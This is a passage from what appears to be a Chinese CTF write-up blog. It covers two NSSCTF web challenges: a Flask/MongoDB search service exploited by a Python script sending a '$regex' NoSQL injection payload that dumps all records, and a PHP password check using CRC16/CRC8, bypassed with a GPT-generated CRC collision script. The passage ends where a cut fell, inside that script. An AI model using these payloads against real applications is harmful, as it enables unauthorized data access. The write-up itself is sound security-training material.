books=books)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.content_type == <span class="string">&#x27;application/json&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = request.get_json(force=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                title = data.get(<span class="string">&quot;title&quot;</span>)</span><br><span class="line">                author = data.get(<span class="string">&quot;author&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(title, <span class="built_in">str</span>):</span><br><span class="line">                    title = sanitize(title)</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: title&#125;)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(title, <span class="built_in">dict</span>):</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: title&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(author, <span class="built_in">str</span>):</span><br><span class="line">                    author = sanitize(author)</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: author&#125;)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">isinstance</span>(author, <span class="built_in">dict</span>):</span><br><span class="line">                    query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: author&#125;)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> query[<span class="string">&quot;$and&quot;</span>]:</span><br><span class="line">                    books = <span class="built_in">list</span>(books_collection.find(query))</span><br><span class="line">                    <span class="keyword">return</span> jsonify([</span><br><span class="line">                        &#123;<span class="string">&quot;title&quot;</span>: b.get(<span class="string">&quot;title&quot;</span>), <span class="string">&quot;author&quot;</span>: b.get(<span class="string">&quot;author&quot;</span>), <span class="string">&quot;description&quot;</span>: b.get(<span class="string">&quot;description&quot;</span>)&#125; <span class="keyword">for</span> b <span class="keyword">in</span> books</span><br><span class="line">                    ])</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Empty query&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="built_in">str</span>(e)&#125;), <span class="number">500</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Unsupported Content-Type&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p><strong>NoSQL 注入 (MongoDB 注入)</strong>，通过<code>post</code>字典参数，<strong>绕过</strong>过滤函数</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造目标 URL</span></span><br><span class="line">URL = <span class="string">&quot;http://node9.anna.nssctf.cn:29421/search&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 攻击载荷 (Payload) ---</span></span><br><span class="line"><span class="comment"># 利用 MongoDB 的 $regex 操作符来匹配所有文档，从而 dump 出全部数据。</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;$regex&quot;</span>: <span class="string">&quot;.*&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;author&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;$regex&quot;</span>: <span class="string">&quot;.*&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 请求头 ---</span></span><br><span class="line"><span class="comment"># 必须指定 Content-Type 为 application/json</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    发送恶意请求并获取 flag 的主函数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 准备攻击目标: <span class="subst">&#123;URL&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 使用的 Payload: <span class="subst">&#123;json.dumps(payload)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 发送 POST 请求</span></span><br><span class="line">        response = requests.post(URL, headers=headers, json=payload, timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查响应状态码</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n[+] 请求成功！服务器返回状态码 200 OK。&quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 解析返回的 JSON 数据</span></span><br><span class="line">                books = response.json()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> books:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[-] 查询成功，但未返回任何书籍信息。&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*] 查询到以下书籍信息：&quot;</span>)</span><br><span class="line">                <span class="comment"># 格式化输出结果</span></span><br><span class="line">                <span class="keyword">for</span> i, book <span class="keyword">in</span> <span class="built_in">enumerate</span>(books, <span class="number">1</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n--- 第 <span class="subst">&#123;i&#125;</span> 本书 ---&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  书名 (Title): <span class="subst">&#123;book.get(<span class="string">&#x27;title&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  作者 (Author): <span class="subst">&#123;book.get(<span class="string">&#x27;author&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  描述 (Description): <span class="subst">&#123;book.get(<span class="string">&#x27;description&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n[*] Flag 可能隐藏在以上信息中，请仔细查找。&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] 错误：无法解析服务器返回的 JSON 数据。&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    原始响应内容: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 攻击失败！服务器返回状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    响应内容: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 请求过程中发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 发生未知错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure><h2 id="EzCRC"><a href="#EzCRC" class="headerlink" title="EzCRC"></a>EzCRC</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compute_crc16</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$checksum</span> = <span class="number">0xFFFF</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$checksum</span> ^= <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="number">8</span>; <span class="variable">$j</span>++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$checksum</span> &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="variable">$checksum</span> = ((<span class="variable">$checksum</span> &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xA001</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$checksum</span> &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$checksum</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">calculate_crc8</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$crc8_table</span> = [</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x0E</span>, <span class="number">0x09</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x12</span>, <span class="number">0x15</span>,</span><br><span class="line">        <span class="number">0x38</span>, <span class="number">0x3F</span>, <span class="number">0x36</span>, <span class="number">0x31</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>,</span><br><span class="line">        <span class="number">0x70</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x79</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x65</span>,</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x4F</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>,</span><br><span class="line">        <span class="number">0xE0</span>, <span class="number">0xE7</span>, <span class="number">0xEE</span>, <span class="number">0xE9</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xF2</span>, <span class="number">0xF5</span>,</span><br><span class="line">        <span class="number">0xD8</span>, <span class="number">0xDF</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>, <span class="number">0xC4</span>, <span class="number">0xC3</span>, <span class="number">0xCA</span>, <span class="number">0xCD</span>,</span><br><span class="line">        <span class="number">0x90</span>, <span class="number">0x97</span>, <span class="number">0x9E</span>, <span class="number">0x99</span>, <span class="number">0x8C</span>, <span class="number">0x8B</span>, <span class="number">0x82</span>, <span class="number">0x85</span>,</span><br><span class="line">        <span class="number">0xA8</span>, <span class="number">0xAF</span>, <span class="number">0xA6</span>, <span class="number">0xA1</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0xBA</span>, <span class="number">0xBD</span>,</span><br><span class="line">        <span class="number">0xC7</span>, <span class="number">0xC0</span>, <span class="number">0xC9</span>, <span class="number">0xCE</span>, <span class="number">0xDB</span>, <span class="number">0xDC</span>, <span class="number">0xD5</span>, <span class="number">0xD2</span>,</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xED</span>, <span class="number">0xEA</span>,</span><br><span class="line">        <span class="number">0xB7</span>, <span class="number">0xB0</span>, <span class="number">0xB9</span>, <span class="number">0xBE</span>, <span class="number">0xAB</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0xA2</span>,</span><br><span class="line">        <span class="number">0x8F</span>, <span class="number">0x88</span>, <span class="number">0x81</span>, <span class="number">0x86</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x9D</span>, <span class="number">0x9A</span>,</span><br><span class="line">        <span class="number">0x27</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x2E</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x35</span>, <span class="number">0x32</span>,</span><br><span class="line">        <span class="number">0x1F</span>, <span class="number">0x18</span>, <span class="number">0x11</span>, <span class="number">0x16</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>,</span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x59</span>, <span class="number">0x5E</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x42</span>,</span><br><span class="line">        <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>,</span><br><span class="line">        <span class="number">0x89</span>, <span class="number">0x8E</span>, <span class="number">0x87</span>, <span class="number">0x80</span>, <span class="number">0x95</span>, <span class="number">0x92</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>,</span><br><span class="line">        <span class="number">0xB1</span>, <span class="number">0xB6</span>, <span class="number">0xBF</span>, <span class="number">0xB8</span>, <span class="number">0xAD</span>, <span class="number">0xAA</span>, <span class="number">0xA3</span>, <span class="number">0xA4</span>,</span><br><span class="line">        <span class="number">0xF9</span>, <span class="number">0xFE</span>, <span class="number">0xF7</span>, <span class="number">0xF0</span>, <span class="number">0xE5</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>,</span><br><span class="line">        <span class="number">0xC1</span>, <span class="number">0xC6</span>, <span class="number">0xCF</span>, <span class="number">0xC8</span>, <span class="number">0xDD</span>, <span class="number">0xDA</span>, <span class="number">0xD3</span>, <span class="number">0xD4</span>,</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>,</span><br><span class="line">        <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0x4D</span>, <span class="number">0x4A</span>, <span class="number">0x43</span>, <span class="number">0x44</span>,</span><br><span class="line">        <span class="number">0x19</span>, <span class="number">0x1E</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>,</span><br><span class="line">        <span class="number">0x21</span>, <span class="number">0x26</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x3D</span>, <span class="number">0x3A</span>, <span class="number">0x33</span>, <span class="number">0x34</span>,</span><br><span class="line">        <span class="number">0x4E</span>, <span class="number">0x49</span>, <span class="number">0x40</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x55</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>,</span><br><span class="line">        <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x78</span>, <span class="number">0x7F</span>, <span class="number">0x6A</span>, <span class="number">0x6D</span>, <span class="number">0x64</span>, <span class="number">0x63</span>,</span><br><span class="line">        <span class="number">0x3E</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>,</span><br><span class="line">        <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>, <span class="number">0x14</span>, <span class="number">0x13</span>,</span><br><span class="line">        <span class="number">0xAE</span>, <span class="number">0xA9</span>, <span class="number">0xA0</span>, <span class="number">0xA7</span>, <span class="number">0xB2</span>, <span class="number">0xB5</span>, <span class="number">0xBC</span>, <span class="number">0xBB</span>,</span><br><span class="line">        <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0x98</span>, <span class="number">0x9F</span>, <span class="number">0x8A</span>, <span class="number">0x8D</span>, <span class="number">0x84</span>, <span class="number">0x83</span>,</span><br><span class="line">        <span class="number">0xDE</span>, <span class="number">0xD9</span>, <span class="number">0xD0</span>, <span class="number">0xD7</span>, <span class="number">0xC2</span>, <span class="number">0xC5</span>, <span class="number">0xCC</span>, <span class="number">0xCB</span>,</span><br><span class="line">        <span class="number">0xE6</span>, <span class="number">0xE1</span>, <span class="number">0xE8</span>, <span class="number">0xEF</span>, <span class="number">0xFA</span>, <span class="number">0xFD</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$bytes</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;C*&#x27;</span>, <span class="variable">$input</span>);</span><br><span class="line">    <span class="variable">$length</span> = <span class="title function_ invoke__">count</span>(<span class="variable">$bytes</span>);</span><br><span class="line">    <span class="variable">$crc</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$k</span> = <span class="number">1</span>; <span class="variable">$k</span> &lt;= <span class="variable">$length</span>; <span class="variable">$k</span>++) &#123;</span><br><span class="line">        <span class="variable">$crc</span> = <span class="variable">$crc8_table</span>[(<span class="variable">$crc</span> ^ <span class="variable">$bytes</span>[<span class="variable">$k</span>]) &amp; <span class="number">0xff</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$crc</span> &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$SECRET_PASS</span> = <span class="string">&quot;Enj0yNSSCTF4th!&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$SECRET_PASS</span>) == <span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$correct_pass_crc16</span> = <span class="title function_ invoke__">compute_crc16</span>(<span class="variable">$SECRET_PASS</span>);</span><br><span class="line">    <span class="variable">$correct_pass_crc8</span> = <span class="title function_ invoke__">calculate_crc8</span>(<span class="variable">$SECRET_PASS</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user_input</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">    <span class="variable">$user_pass_crc16</span> = <span class="title function_ invoke__">compute_crc16</span>(<span class="variable">$user_input</span>);</span><br><span class="line">    <span class="variable">$user_pass_crc8</span> = <span class="title function_ invoke__">calculate_crc8</span>(<span class="variable">$user_input</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$SECRET_PASS</span> === <span class="variable">$user_input</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这样不行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$correct_pass_crc16</span> !== <span class="variable">$user_pass_crc16</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这样也不行&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$correct_pass_crc8</span> !== <span class="variable">$user_pass_crc8</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;这样还是不行吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$granted_access</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$granted_access</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;都到这份上了,flag就给你了: <span class="subst">$FLAG</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;不不不&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;再试试&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要构造长度<code>15</code>的字符串，且<code>crc8</code>与<code>crc16</code>要与题目字符串的<code>crc</code>值一样，直接敲打<code>GPT</code>生成一份<strong>三字节翻转</strong>脚本</p><blockquote><p>CRC（包括 CRC16/CRC8）对二进制翻转是线性的。选择若干字节位（3个字节24个二进制变量），把“目标CRC差值”表示成这些位的线性组合，相当于是求解GF(2)线性方程组。<br>通过高效的GF(2)线性代数（构造基并表示向量），求出一组位翻转，使得修改后的字符串与secret的CRC16+CRC8完全相同。</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">crc_collision.py</span></span><br><span class="line"><span class="string">Find a different message (same length) that is NOT equal to the secret but has identical CRC16 and CRC8.</span></span><br><span class="line"><span class="string">Method:</span></span><br><span class="line"><span class="string"> - Choose k byte positions to allow flipping (default k=3 -&gt; 24 binary variables).</span></span><br><span class="line"><span class="string"> - For a given base message, precompute the 24-bit effect (&quot;columns&quot;) of flipping each single bit</span></span><br><span class="line"><span class="string">   in those positions. The combined CRC (CRC16&lt;&lt;8 | CRC8) is a 24-bit linear function over GF(2).</span></span><br><span class="line"><span class="string"> - Build a GF(2) basis from the columns, then try to represent the difference between base_crc24 and</span></span><br><span class="line"><span class="string">   target_crc24 as an XOR of columns. If representable, we get which bits to flip -&gt; candidate message.</span></span><br><span class="line"><span class="string"> - Repeat for random base messages or different position sets until a valid candidate is found.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- CRC implementations matching the PHP code ----</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_crc16</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    checksum = <span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">        checksum ^= b</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> checksum &amp; <span class="number">1</span>:</span><br><span class="line">                checksum = ((checksum &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xA001</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                checksum &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> checksum &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">crc8_table = [</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x0E</span>, <span class="number">0x09</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x12</span>, <span class="number">0x15</span>, <span class="number">0x38</span>, <span class="number">0x3F</span>, <span class="number">0x36</span>, <span class="number">0x31</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x79</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x4F</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xE7</span>, <span class="number">0xEE</span>, <span class="number">0xE9</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xF2</span>, <span class="number">0xF5</span>, <span class="number">0xD8</span>, <span class="number">0xDF</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>, <span class="number">0xC4</span>, <span class="number">0xC3</span>, <span class="number">0xCA</span>, <span class="number">0xCD</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x97</span>, <span class="number">0x9E</span>, <span class="number">0x99</span>, <span class="number">0x8C</span>, <span class="number">0x8B</span>, <span class="number">0x82</span>, <span class="number">0x85</span>, <span class="number">0xA8</span>, <span class="number">0xAF</span>, <span class="number">0xA6</span>, <span class="number">0xA1</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0xBA</span>, <span class="number">0xBD</span>,</span><br><span class="line">    <span class="number">0xC7</span>, <span class="number">0xC0</span>, <span class="number">0xC9</span>, <span class="number">0xCE</span>, <span class="number">0xDB</span>, <span class="number">0xDC</span>, <span class="number">0xD5</span>, <span class="number">0xD2</span>, <span class="number">0xFF</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xED</span>, <span class="number">0xEA</span>,</span><br><span class="line">    <span class="number">0xB7</span>, <span class="number">0xB0</span>, <span class="number">0xB9</span>, <span class="number">0xBE</span>, <span class="number">0xAB</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0xA2</span>, <span class="number">0x8F</span>, <span class="number">0x88</span>, <span class="number">0x81</span>, <span class="number">0x86</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x9D</span>, <span class="number">0x9A</span>,</span><br><span class="line">    <span class="number">0x27</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x2E</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x35</span>, <span class="number">0x32</span>, <span class="number">0x1F</span>, <span class="number">0x18</span>, <span class="number">0x11</span>, <span class="number">0x16</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>,</span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x59</span>, <span class="number">0x5E</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x42</span>, <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x8E</span>, <span class="number">0x87</span>, <span class="number">0x80</span>, <span class="number">0x95</span>, <span class="number">0x92</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>, <span class="number">0xB1</span>, <span class="number">0xB6</span>, <span class="number">0xBF</span>, <span class="number">0xB8</span>, <span class="number">0xAD</span>, <span class="number">0xAA</span>, <span class="number">0xA3</span>, <span class="number">0xA4</span>,</span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0xFE</span>, <span class="number">0xF7</span>, <span class="number">0xF0</span>, <span class="number">0xE5</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>, <span class="number">0xC1</span>, <span class="number">0xC6</span>, <span class="number">0xCF</span>, <span class="number">0xC8</span>, <span class="number">0xDD</span>, <span class="number">0xDA</span>, <span class="number">0xD3</span>, <span 